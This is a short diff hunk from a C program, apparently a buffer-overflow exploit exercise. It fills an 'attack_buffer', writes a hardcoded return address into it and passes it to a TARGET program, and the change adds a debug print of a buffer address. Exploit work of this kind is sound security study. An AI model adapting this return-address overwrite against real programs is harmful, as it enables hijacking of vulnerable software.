@@ -26,6 +26,8 @@ main ( int argc, char * argv[] )
 	*ret_address = 0x2021fe10;
 	attack_buffer[BUF_SIZE - 1] = '\0';
 
+	printf("&attack_buffer[120] as hex: %u\n",&attack_buffer[120]);
+
 	args[0] = TARGET;
 	args[1] = attack_buffer;
 	args[2] = NULL;
